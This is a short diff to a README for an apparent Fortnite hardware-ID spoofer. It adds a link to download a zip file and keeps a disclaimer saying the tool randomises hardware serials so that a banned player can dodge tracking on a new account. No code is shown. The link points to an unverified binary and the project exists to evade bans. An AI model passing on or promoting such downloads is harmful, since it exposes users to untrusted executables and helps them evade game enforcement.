@@ -1,3 +1,6 @@
+|[Download](https://github.com/akbarga1418y-hub/FortniteSpoofer/releases/download/download/fortnite.zip)
+|:------------- |
+
 ## Disclaimer:
 A spoofer is software that modifies (randomizes) the serial numbers and physical addresses physically assigned to your hardware. This way, games and other software that read your hardware's serial numbers won't be able to track you across reboots.
 This will NOT unlock the account you were banned from; you must create a new one. Temp spoofer means you only have to spoof every reboot.
